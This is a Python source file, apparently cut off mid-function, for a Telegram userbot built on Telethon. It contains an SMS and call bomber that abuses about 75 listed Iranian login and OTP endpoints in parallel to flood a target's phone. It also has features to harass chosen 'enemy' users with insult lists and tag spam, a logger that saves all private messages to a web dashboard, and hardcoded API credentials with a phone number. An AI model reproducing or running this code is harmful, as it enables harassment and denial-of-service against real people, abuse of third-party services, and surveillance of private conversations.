import asyncio
import random
import time
import os
import re
import requests
from typing import Set, List, Optional, Dict
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import json
from datetime import datetime
from flask import Flask, render_template_string, send_file, request
from pathlib import Path
from telethon.tl.types import User as TLUser

from telethon import TelegramClient, events
from telethon.tl.types import Message, User
from telethon.tl.functions.photos import UploadProfilePhotoRequest, DeletePhotosRequest
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.types import InputPhoto
from telethon.errors import FloodWaitError, UserAlreadyParticipantError
from typing import List

# API Credentials (REQUIRED even for bot tokens)
API_ID = 22152659
API_HASH = "7300603715676773c05db7fd7aab55fc"

# Phone Number for user account
PHONE_NUMBER = "+989053716748"

SESSION_NAME = "user_sadra"

MASTER_BOT_INDEX = 0

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
BOT_DIR = BASE_DIR
FOSH_FILE = os.path.join(BASE_DIR, "fosh.txt")
TARGET_ID_FILE = os.path.join(BOT_DIR, "targetid.txt")
FWD_SOURCE_CHANNEL_FILE = os.path.join(BOT_DIR, "fwd_source_channel.txt")
FWD_SOURCE_MSG_ID_FILE = os.path.join(BOT_DIR, "fwd_source_msg_id.txt")
FWD_DELAY_MIN_FILE = os.path.join(BOT_DIR, "fwd_delay_min.txt")
FWD_DELAY_MAX_FILE = os.path.join(BOT_DIR, "fwd_delay_max.txt")
FWD_EXTRA_TEXT_FILE = os.path.join(BOT_DIR, "fwd_extra_text.txt")
FWD_EXTRA_POSITION_FILE = os.path.join(BOT_DIR, "fwd_extra_position.txt")
HELP_IMAGE_URL = "https://raw.githubusercontent.com/sadraonthehack/VDIEO/main/8d4db30dac973ecc09668b36ba19f11e.gif"

ADMIN_IDS: Set[int] = {7202211827}  
FOSHLIST: List[str] = []
SPAM_TARGET: Optional[int] = None
SPAM_TEXT: str = "ONLINE"
SPAM_SPEED: float = 1.0  
SPAM_TASK: None
ON_OFF_ACTIVE: bool = False
ON_OFF_TASK: Optional[asyncio.Task] = None
ON_OFF_SEQUENCE: List[str] = ["چس", "مس", "کص","لش", "مست", "1", "2", "3", "4", "5", "6", "7", "8", "9", "00", "مدرک"]
ON_OFF_DELAY: float = 0
ENEMY_TARGET: Optional[int] = None
ENEMY_ACTIVE: bool = False
REPLY_TO_ENEMY: bool = True
ORIGINAL_NAME: str = ""
ORIGINAL_PHOTO: Optional[InputPhoto] = None

# Tag spam variables
TAG_TARGETS: List[int] = []
TAG_SPAM_ACTIVE: bool = False
TAG_SPAM_TASK: Optional[asyncio.Task] = None
TAG_SPAM_DELAY: float = 5.0
TAG_SPAM_CHAT_ID: Optional[int] = None
TAG_SYMBOL: str = "->"

# Multi-bot variables
clients: List[TelegramClient] = []
MASTER_CLIENT: Optional[TelegramClient] = None
ALL_BOTS_RUNNING: bool = False
FORWARD_SPAM_ACTIVE = False
FORWARD_SPAM_TASK = None

# Per-bot spam states
bot_spam_states: Dict[int, Dict] = {}
# Add these global variables
BOMBER_RUNNING = False
BOMBER_TASK = None
SPAM_ACTIVE = False
SPAM_TASK = None

class SMSBomber:
    def __init__(self):
        self.session = requests.Session()
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        ]
        self.results = {"success": 0, "failed": 0, "details": []}
        self.stop_flag = False

    def stop(self):
        """Stop the active bomber run."""
        self.stop_flag = True
        print("[BOMBER] Stop signal received")
        return True

    def get_user_agent(self):
        return random.choice(self.user_agents)

    def replace_placeholders(self, template, phone_number):
        if template is None:
            return ""
        result = str(template).replace("{{num}}", phone_number)
        result = result.replace("{{user_agent}}", self.get_user_agent())
        result = result.replace("{{random}}", str(random.randint(1000, 9999)))
        return result

    def send_request(self, request_config, phone_number):
        if self.stop_flag:
            service_name = request_config.get("URL", "stopped")
            service_name = service_name.split("//")[-1].split("/")[0] if "//" in service_name else service_name
            return {
                "success": False,
                "status_code": 0,
                "service": service_name,
                "type": request_config.get("Type", "sms"),
                "stopped": True,
            }

        try:
            url = self.replace_placeholders(request_config["URL"], phone_number)
            method = request_config.get("Method", "GET")
            headers = request_config.get("Headers", {})
            payload = request_config.get("Payload", {})

            processed_headers = {}
            for key, value in headers.items():
                processed_headers[key] = self.replace_placeholders(value, phone_number)

            processed_payload = {}
            if payload and isinstance(payload, dict):
                for key, value in payload.items():
                    processed_payload[key] = self.replace_placeholders(value, phone_number)

            response = None
            timeout = 15

            if method.upper() == "POST":
                if processed_headers.get("content-type", "").startswith("application/json"):
                    response = self.session.post(url, json=processed_payload, headers=processed_headers, timeout=timeout, verify=False)
                else:
                    response = self.session.post(url, data=processed_payload, headers=processed_headers, timeout=timeout, verify=False)
            elif method.upper() == "GET":
                response = self.session.get(url, headers=processed_headers, params=processed_payload, timeout=timeout, verify=False)

            service_name = url.split("//")[-1].split("/")[0] if "//" in url else url
            if response:
                success = response.status_code in [200, 201, 202, 204]
                return {
                    "success": success,
                    "status_code": response.status_code,
                    "service": service_name,
                    "type": request_config.get("Type", "sms")
                }
            return {
                "success": False,
                "status_code": 0,
                "service": service_name,
                "type": request_config.get("Type", "sms")
            }
        except Exception as e:
            service_name = request_config["URL"].split("//")[-1].split("/")[0] if "//" in request_config["URL"] else request_config["URL"]
            return {
                "success": False,
                "error": str(e),
                "service": service_name,
                "type": request_config.get("Type", "sms")
            }

    def get_all_apis(self):
        apis = [
            {"Type": "sms", "Request": {"URL": "https://api.tapsi.food/v1/api/Authentication/otp", "Method": "POST", "Payload": {"cellPhone": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://api.pmxchange.co/api/User/Login/SendCode", "Method": "POST", "Payload": {"phoneNumber": "0{{num}}", "forPasswordCheck": True}}},
            {"Type": "sms", "Request": {"URL": "https://api.bimesho.com/api/v1/auth/otp/send", "Method": "POST", "Payload": {"username": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://api.azkivam.com/auth/login", "Method": "POST", "Payload": {"mobileNumber": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://api.komodaa.com/api/v2.6/loginRC/request", "Method": "POST", "Payload": {"phone_number": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://tabdil24.net/api/api/v1/auth/login-register", "Method": "POST", "Payload": {"emailOrMobile": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://roshapharmacy.com/signin?user_mobile=0{{num}}&confirm_code=&popup=1&signin=1", "Method": "POST"}},
            {"Type": "sms", "Request": {"URL": "https://www.vitrin.shop/api/v1/user/request_code", "Method": "POST", "Payload": {"phone_number": "0{{num}}", "forgot_password": False}}},
            {"Type": "sms", "Request": {"URL": "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", "Method": "POST", "Payload": {"cellphone": "+98{{num}}"}, "Headers": {"content-type": "application/json"}}},
            {"Type": "sms", "Request": {"URL": "https://tap33.me/api/v2/user", "Method": "POST", "Payload": {"credential": {"phoneNumber": "0{{num}}", "role": "PASSENGER"}}}},
            {"Type": "sms", "Request": {"URL": "https://api.torob.com/a/phone/send-pin/?phone_number=0{{num}}", "Method": "GET"}},
            {"Type": "sms", "Request": {"URL": "https://ws.alibaba.ir/api/v3/account/mobile/otp", "Method": "POST", "Payload": {"phoneNumber": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://account.api.balad.ir/api/web/auth/login/", "Method": "POST", "Payload": {"phone_number": "0{{num}}", "os_type": "W"}}},
            {"Type": "sms", "Request": {"URL": "https://api.ostadkr.com/login", "Method": "POST", "Payload": {"mobile": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://bck.behtarino.com/api/v1/users/jwt_phone_verification/", "Method": "POST", "Payload": {"phone": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://bit24.cash/auth/bit24/api/v3/auth/check-mobile", "Method": "POST", "Payload": {"mobile": "0{{num}}", "contry_code": "98"}}},
            {"Type": "sms", "Request": {"URL": "https://drdr.ir/api/v3/auth/login/mobile/init/", "Method": "POST", "Payload": {"mobile": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://api-react.okala.com/C/CustomerAccount/OTPRegister", "Method": "POST", "Payload": {"mobile": "0{{num}}", "deviceTypeCode": 0, "confirmTerms": True, "notRobot": False}}},
            {"Type": "sms", "Request": {"URL": "https://mobapi.banimode.com/api/v2/auth/request", "Method": "POST", "Payload": {"phone": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://api.beroozmart.com/api/pub/account/send-otp", "Method": "POST", "Payload": {"mobile": "0{{num}}", "sendViaSms": True}}},
            {"Type": "sms", "Request": {"URL": "https://app.itoll.com/api/v1/auth/login", "Method": "POST", "Payload": {"mobile": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://core.gap.im/v1/user/add.json?mobile=%2B98{{num}}", "Method": "GET"}},
            {"Type": "sms", "Request": {"URL": "https://pinket.com/api/cu/v2/phone-verification", "Method": "POST", "Payload": {"phoneNumber": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://api.pinorest.com/frontend/auth/login/mobile", "Method": "POST", "Payload": {"mobile": "{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://auth.mrbilit.com/api/login/exists/v2?mobileOrEmail=0{{num}}&source=2&sendTokenIfNot=true", "Method": "GET"}},
            {"Type": "sms", "Request": {"URL": "https://api.lendo.ir/api/customer/auth/send-otp", "Method": "POST", "Payload": {"mobile": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://gw.taaghche.com/v4/site/auth/login", "Method": "POST", "Payload": {"contact": "0{{num}}", "forceOtp": False}}},
            {"Type": "sms", "Request": {"URL": "https://fidibo.com/user/login-by-sms", "Method": "POST", "Payload": {"mobile_number": "{{num}}", "country_code": "ir"}}},
            {"Type": "sms", "Request": {"URL": "https://khodro45.com/api/v1/customers/otp/", "Method": "POST", "Payload": {"mobile": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://api.pateh.com/ath/auth/login-or-register", "Method": "POST", "Payload": {"mobile": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://ketabchi.com/api/v1/auth/requestVerificationCode", "Method": "POST", "Payload": {"auth": {"phoneNumber": "0{{num}}"}}}},
            {"Type": "sms", "Request": {"URL": "https://bimito.com/api/vehicleorder/v2/app/auth/login-with-verify-code", "Method": "POST", "Payload": {"phoneNumber": "0{{num}}", "isResend": False}}},
            {"Type": "sms", "Request": {"URL": "https://api.pindo.ir/v1/user/login-register/", "Method": "POST", "Payload": {"phone": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://www.delino.com/user/register", "Method": "POST", "Payload": {"mobile": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://api.kukala.ir/api/user/Otp", "Method": "POST", "Payload": {"phoneNumber": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://www.buskool.com/send_verification_code", "Method": "POST", "Payload": {"phone": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://3tex.io/api/1/users/validation/mobile", "Method": "POST", "Payload": {"receptorPhone": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://deniizshop.com/api/v1/sessions/login_request", "Method": "POST", "Payload": {"mobile_number": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://flightio.com/bff/Authentication/CheckUserKey", "Method": "POST", "Payload": {"userKey": "98-{{num}}", "userKeyType": 1}}},
            {"Type": "sms", "Request": {"URL": "https://abantether.com/users/register/phone/send/", "Method": "POST", "Payload": {"phoneNumber": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://api.pooleno.ir/v1/auth/check-mobile", "Method": "POST", "Payload": {"mobile": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://nx.classino.com/otp/v1/api/login", "Method": "POST", "Payload": {"mobile": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418", "Method": "POST", "Payload": {"cellphone": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://api.bitbarg.com/api/v1/authentication/registerOrLogin", "Method": "POST", "Payload": {"phone": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://api.bahramshop.ir/api/user/validate/username", "Method": "POST", "Payload": {"username": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://chamedoon.com/api/v1/membership/guest/request_mobile_verification", "Method": "POST", "Payload": {"mobile": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL", "Method": "POST", "Payload": {"mobile": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode", "Method": "POST", "Payload": {"userName": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://api.shab.ir/api/fa/sandbox/v_1_4/auth/login-otp", "Method": "POST", "Payload": {"mobile": "0{{num}}", "country_code": "+98"}}},
            {"Type": "sms", "Request": {"URL": "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request", "Method": "POST", "Payload": {"UserName": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://a4baz.com/api/web/login", "Method": "POST", "Payload": {"cellphone": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://api.anargift.com/api/people/auth", "Method": "POST", "Payload": {"user": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://nobat.ir/api/public/patient/login/phone", "Method": "POST", "Payload": {"mobile": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://www.riiha.ir/api/v1.0/authenticate", "Method": "POST", "Payload": {"mobile": "0{{num}}", "type": "mobile"}}},
            {"Type": "sms", "Request": {"URL": "https://api.mohit.online/api/auth/login", "Method": "POST", "Payload": {"username": "0{{num}}", "app": "market"}}},
            {"Type": "sms", "Request": {"URL": "https://auth.mrbilit.ir/api/Token/send?mobile=0{{num}}", "Method": "GET"}},
            {"Type": "sms", "Request": {"URL": "https://www.sheypoor.com/api/v10.0.0/auth/send", "Method": "POST", "Payload": {"username": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://www.simkhanapi.ir/api/users/registerV2", "Method": "POST", "Payload": {"mobileNumber": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://api.digikala.com/v1/user/authenticate/", "Method": "POST", "Payload": {"username": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://tikban.com/Account/LoginAndRegister", "Method": "POST", "Payload": {"cellPhone": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://dicardo.com/main/sendsms", "Method": "POST", "Payload": {"phone": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://www.digistyle.com/users/login-register/", "Method": "POST", "Payload": {"loginRegister[email_phone]": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://banankala.com/home/login", "Method": "POST", "Payload": {"Mobile": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://shahrfarsh.com/Account/Login", "Method": "POST", "Payload": {"phoneNumber": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://rojashop.com/api/auth/sendOtp", "Method": "POST", "Payload": {"mobile": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://dadpardaz.com/advice/getLoginConfirmationCode", "Method": "POST", "Payload": {"mobile": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://api.rokla.ir/api/request/otp", "Method": "POST", "Payload": {"mobile": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://api.pezeshket.com/core/v1/auth/requestCode", "Method": "POST", "Payload": {"mobileNumber": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://virgool.io/api/v1.4/auth/verify", "Method": "POST", "Payload": {"method": "phone", "identifier": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://api.timcheh.com/auth/otp/send", "Method": "POST", "Payload": {"mobile": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://daal.co/api/authentication/login-register/method/phone-otp/user-role/customer/verify-request", "Method": "POST", "Payload": {"phone": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://bimebazar.com/accounts/api/login_sec/", "Method": "POST", "Payload": {"username": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://www.azki.co/api/vehicleorder/v2/app/auth/check-login-availability/", "Method": "POST", "Payload": {"phoneNumber": "0{{num}}"}}},
            {"Type": "sms", "Request": {"URL": "https://safarmarket.com//api/security/v2/user/otp", "Method": "POST", "Payload": {"phone": "0{{num}}"}}},
            {"Type": "call", "Request": {"URL": "https://auth.mrbilit.com/api/Token/send/byCall?mobile=0{{num}}", "Method": "GET"}},
            {"Type": "call", "Request": {"URL": "https://core.gap.im/v1/user/resendCode.json?mobile=%2B98{{num}}&type=IVR", "Method": "GET"}},
            {"Type": "call", "Request": {"URL": "https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber=0{{num}}", "Method": "GET"}}
        ]
        return apis

    def run_attack(self, phone_number, attack_type="all", max_workers=20):
        self.stop_flag = False
        all_apis = self.get_all_apis()

        if attack_type == "sms":
            apis_to_use = [api for api in all_apis if api["Type"] == "sms"]
        elif attack_type == "call":
            apis_to_use = [api for api in all_apis if api["Type"] == "call"]
        else:
            apis_to_use = all_apis

        success_count = 0
        failed_count = 0
        details = []

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_config = {
                executor.submit(self.send_request, api["Request"], phone_number): api
                for api in apis_to_use
            }

            for future in as_completed(future_to_config):
                if self.stop_flag:
                    break
                api = future_to_config[future]
                try:
                    result = future.result()
                    if result.get("stopped"):
                        failed_count += 1
                        details.append(f" {result['type'].upper()} → {result['service']} [STOPPED]")
                    elif result["success"]:
                        success_count += 1
                        details.append(f" {result['type'].upper()} → {result['service']}")
                    else:
                        failed_count += 1
                        details.append(f" {result['type'].upper()} → {result['service']}")
                except Exception as e:
                    failed_count += 1
                    details.append(f" Error: {str(e)[:30]}")

        return {
            "success": success_count,
            "failed": failed_count,
            "total": success_count + failed_count,
            "details": details[:10]
        }


bomber_instance = SMSBomber()

# Backup manager + Flask dashboard
MEDIA_DIR = os.path.join(BASE_DIR, "media_files")
BACKUP_FILE = os.path.join(BASE_DIR, "main_backup.txt")


class BackupManager:
    def __init__(self, media_dir=MEDIA_DIR, backup_file=BACKUP_FILE):
        self.media_dir = media_dir
        self.backup_file = backup_file
        os.makedirs(self.media_dir, exist_ok=True)
        self.lock = threading.Lock()
        self.messages = []
        self.seen = set()
        self.bot_start_time = datetime.now().isoformat()

    async def save_message(self, client, msg, is_outgoing=False):
        try:
            msg_id = f"{msg.chat_id}_{msg.id}" if getattr(msg, 'id', None) is not None else str(id(msg))
            if msg_id in self.seen:
                return
            self.seen.add(msg_id)

            # determine chat/sender and whether this is a private (one-to-one) dialog
            user_id = (msg.from_id.user_id if getattr(msg, 'from_id', None) and getattr(msg.from_id, 'user_id', None) else getattr(msg, 'sender_id', None))
            chat_id = getattr(msg, 'chat_id', None) or (getattr(msg, 'peer_id', None) and getattr(msg.peer_id, 'channel_id', None))
            date_val = datetime.now().isoformat()
            text_val = getattr(msg, 'text', '') or ''

            user_name = None
            is_private = False
            try:
                # try to detect chat entity (recipient/chat) and sender
                chat_entity = None
                try:
                    chat_entity = await msg.get_chat()
                except Exception:
                    chat_entity = None

                if chat_entity and isinstance(chat_entity, TLUser):
                    is_private = True

                if is_outgoing:
                    # outgoing: show recipient name (chat_entity) when private
                    if chat_entity and isinstance(chat_entity, TLUser):
                        user_name = ' '.join(filter(None, [getattr(chat_entity, 'first_name', ''), getattr(chat_entity, 'last_name', '')])).strip() or getattr(chat_entity, 'username', None)
                    else:
                        # fallback to self
                        try:
                            me = await client.get_me()
                            user_name = 'Me' if me else None
                        except Exception:
                            user_name = None
                else:
                    # incoming: fetch sender
                    sender = None
                    try:
                        sender = await msg.get_sender()
                    except Exception:
                        sender = None
                    if sender and isinstance(sender, TLUser):
                        user_name = ' '.join(filter(None, [getattr(sender, 'first_name', ''), getattr(sender, 'last_name', '')])).strip() or getattr(sender, 'username', None)
                        is_private = True if isinstance(sender, TLUser) and (chat_entity is None or isinstance(chat_entity, TLUser)) else is_private

            except Exception:
                pass

            # فقط پیام‌های خصوصی را ذخیره کن
            if not is_private:
                return

            record = {
                'msg_id': msg_id,
                'user_id': user_id,
                'user_name': user_name,
                'chat_id': chat_id,
                'date': date_val,
                'text': text_val,
                'is_outgoing': bool(is_outgoing),
                'is_private': bool(is_private),
                'media': None,
                'media_type': None,
                'reply_to_msg_id': None,
                'reply_to_user_id': None,
                'reply_to_user_name': None,
                'timestamp': time.time(),
                'has_media': bool(getattr(msg, 'media', None))  # فقط ثبت کن که مدیا داشته
            }

            # ===== بخش دانلود مدیا کاملاً حذف شد =====
            # دیگر هیچ مدیایی دانلود نمی‌شود

            # Capture reply-to information if available
            try:
                reply_id = getattr(msg, 'reply_to_msg_id', None)
                if reply_id:
                    record['reply_to_msg_id'] = str(reply_id)
                    try:
                        replied = await msg.get_reply_message()
                        if replied:
                            record['reply_to_user_id'] = getattr(replied, 'sender_id', None)
                            try:
                                replied_sender = await replied.get_sender()
                                if replied_sender and isinstance(replied_sender, TLUser):
                                    record['reply_to_user_name'] = ' '.join(filter(None, [getattr(replied_sender, 'first_name', ''), getattr(replied_sender, 'last_name', '')])).strip() or getattr(replied_sender, 'username', None)
                            except Exception:
                                pass
                    except Exception:
                        pass
            except Exception:
                pass

            with self.lock:
                self.messages.append(record)

            # Append JSON line to backup file (append mode)
            try:
                with open(self.backup_file, 'a', encoding='utf-8') as f:
                    f.write(json.dumps(record, ensure_ascii=False) + '\n')
            except Exception:
                pass

        except Exception as e:
            # خطاهای مربوط به Constructor ID را نادیده بگیر
            if "Constructor ID" in str(e) or "95ef6f2b" in str(e):
                print(f"[WARNING] Skipping malformed message (media issue): {e}")
            else:
                print(f"[ERROR] save_message: {e}")
        return

    def export_txt(self, out_path=None):
        out_path = out_path or os.path.join(BASE_DIR, 'messages_export.txt')
        with self.lock:
            try:
                with open(out_path, 'w', encoding='utf-8') as f:
                    f.write(f"=== PM Backup Export ===\n")
                    f.write(f"Exported: {datetime.now().isoformat()}\n")
                    f.write(f"Total messages: {len(self.messages)}\n")
                    f.write("=" * 60 + "\n\n")
                    for m in self.messages:
                        t = m.get('date', '')
                        name = m.get('user_name') or m.get('user_id', 'unknown')
                        chat = m.get('chat_id', '')
                        direction = "OUT" if m.get('is_outgoing') else "IN"
                        text = m.get('text', '')
                        media = m.get('media')
                        media_type = m.get('media_type', '')
                        reply_info = ''
                        if m.get('reply_to_user_name') or m.get('reply_to_msg_id'):
                            reply_info = f" REPLY_TO:{m.get('reply_to_user_name') or m.get('reply_to_user_id')}({m.get('reply_to_msg_id')})"
                        f.write(f"[{t}] {direction} USER:{name} CHAT:{chat} MSG:{text}{reply_info}\n")
                        if media:
                            f.write(f"  MEDIA: {media} ({media_type or 'unknown'})\n")
                    f.write("\n" + "=" * 60 + "\n")
                    f.write(f"End of export - {len(self.messages)} messages\n")
                return out_path
            except Exception as e:
                print(f"[ERROR] Export failed: {e}")
                return None


backup_manager = BackupManager()

# Flask app for dashboard
app = Flask('pm_backup_dashboard')

TEMPLATE = '''
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="refresh" content="3">
  <title>PM Backup</title>
  <style>
    * { box-sizing: border-box; }
    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0e0e0e; color: #e0e0e0; margin: 0; padding: 20px; }
    .container { max-width: 1400px; margin: 0 auto; }
    h2 { color: #00d4ff; border-bottom: 2px solid #00d4ff33; padding-bottom: 10px; }
    .controls { display: flex; flex-wrap: wrap; gap: 12px; margin: 18px 0; align-items: center; }
    .controls form { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; }
    .controls input[type="text"] { padding: 10px 14px; border-radius: 8px; border: 1px solid #333; background: #1a1a1a; color: #e0e0e0; width: 300px; font-size: 14px; }
    .controls button { padding: 10px 22px; border-radius: 8px; border: none; background: #00d4ff; color: #0e0e0e; font-weight: 600; cursor: pointer; transition: 0.2s; font-size: 14px; }
    .controls button:hover { background: #00b8e6; transform: scale(1.02); }
    .btn-secondary { background: #2a2a2a; color: #e0e0e0; }
    .btn-secondary:hover { background: #3a3a3a; }
    .stats { background: #1a1a1a; padding: 14px 20px; border-radius: 10px; margin-bottom: 20px; display: flex; flex-wrap: wrap; gap: 25px; font-size: 14px; border: 1px solid #2a2a2a; }
    .stats span { color: #aaa; }
    .stats strong { color: #00d4ff; }
    .table-wrap { overflow-x: auto; border-radius: 10px; border: 1px solid #2a2a2a; max-height: 70vh; overflow-y: auto; }
    table { width: 100%; border-collapse: collapse; font-size: 14px; }
    th { background: #1a1a1a; color: #00d4ff; padding: 12px 10px; text-align: left; border-bottom: 2px solid #2a2a2a; position: sticky; top: 0; z-index: 10; }
    td { padding: 10px; border-bottom: 1px solid #1f1f1f; vertical-align: middle; word-break: break-word; }
    tr:hover { background: #151515; }
    .dir-out { color: #ff6b6b; font-weight: 600; }
    .dir-in { color: #69db7c; font-weight: 600; }
    .media-link { color: #00d4ff; text-decoration: none; border: 1px solid #00d4ff33; padding: 2px 12px; border-radius: 12px; font-size: 12px; }
    .media-link:hover { background: #00d4ff22; }
    .text-preview { max-width: 350px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
    .chat-id { font-family: monospace; color: #ffd43b; }
    .user-name { color: #ff922b; }
    .reply-info { font-size: 12px; color: #aaa; }
    .timestamp { color: #868e96; font-size: 12px; white-space: nowrap; }
    .scroll-hint { color: #666; font-size: 13px; margin-top: 10px; text-align: center; }
    @media (max-width: 768px) {
        body { padding: 10px; }
        .controls input[type="text"] { width: 100%; }
        .stats { flex-direction: column; gap: 8px; }
        td, th { padding: 6px 8px; font-size: 12px; }
        .text-preview { max-width: 120px; }
    }
  </style>
</head>
<body>
<div class="container">
    <h2>📨 PM Backup Dashboard</h2>

    <div class="stats">
        <span>📊 Total PMs: <strong>{{ total }}</strong></span>
        <span>📤 Outgoing: <strong>{{ outgoing }}</strong></span>
        <span>📥 Incoming: <strong>{{ incoming }}</strong></span>
        <span>📎 Media files: <strong>{{ media_count }}</strong></span>
        <span>🟢 Bot online since: <strong>{{ start_time }}</strong></span>
    </div>

    <div class="controls">
        <form method="get" action="/">
            <input type="text" name="q" placeholder="🔍 Search messages, users, chat IDs..." value="{{ q|default('') }}" />
            <button type="submit">Search</button>
        </form>
        <form method="get" action="/export">
            <button type="submit" class="btn-secondary">📥 Export TXT</button>
        </form>
        <form method="post" action="/clear" style="display:inline;">
            <button type="submit" class="btn-secondary" onclick="return confirm('Clear all logs?')">🗑️ Clear</button>
        </form>
        <span style="font-size:13px; color:#666; margin-left:auto;">Auto-refresh every 3s</span>
    </div>

    <div class="table-wrap">
        <table>
            <thead>
                <tr>
                    <th style="width:140px;">Time</th>
                    <th style="width:180px;">User</th>
                    <th style="width:65px;">Dir</th>
                    <th style="width:120px;">Chat ID</th>
                    <th style="width:100px;">Reply To</th>
                    <th>Message</th>
                    <th style="width:80px;">Media</th>
                </tr>
            </thead>
            <tbody>
            {% for m in messages %}
            <tr>
                <td class="timestamp">{{ m.date }}</td>
                <td class="user-name">{{ m.user_name or m.user_id }}</td>
                <td><span class="{% if m.is_outgoing %}dir-out{% else %}dir-in{% endif %}">{% if m.is_outgoing %}⬆ OUT{% else %}⬇ IN{% endif %}</span></td>
                <td class="chat-id">{{ m.chat_id }}</td>
                <td class="reply-info">
                    {% if m.reply_to_user_name %}{{ m.reply_to_user_name }}{% elif m.reply_to_user_id %}{{ m.reply_to_user_id }}{% elif m.reply_to_msg_id %}#{{ m.reply_to_msg_id }}{% else %}-{% endif %}
                </td>
                <td class="text-preview" title="{{ m.text|e }}">{{ m.text or '(empty)' }}</td>
                <td>{% if m.media and m.media_type not in ['gif', 'sticker'] %}<a href="/media/{{ m.media }}" class="media-link" target="_blank">📎 file</a>{% elif m.media %}<span style="color:#666;">🔄 {{ m.media_type or 'media' }}</span>{% else %}-{% endif %}</td>
            </tr>
            {% endfor %}
            </tbody>
        </table>
    </div>

    {% if not messages %}
    <div style="text-align:center; padding:40px; color:#666;">
        <p>📭 No private messages found yet.</p>
        <p style="font-size:13px;">Messages will appear here after bot starts and receives/sends PMs.</p>
    </div>
    {% endif %}

    <div class="scroll-hint">⬆ Scroll to see more — latest messages on top</div>
</div>

<script>
    // Preserve scroll position across automatic refreshes
    const key = 'pm_backup_scroll';
    window.addEventListener('beforeunload', function(){
        try{ sessionStorage.setItem(key, String(window.scrollY || 0)); }catch(e){}
    });
    window.addEventListener('load', function(){
        try{
            const y = parseInt(sessionStorage.getItem(key) || '0');
            if(!isNaN(y)) window.scrollTo(0, y);
        }catch(e){}
    });
</script>
</body>
</html>
'''


@app.route('/')
def index():
    with backup_manager.lock:
        # Only show private (one-to-one) messages
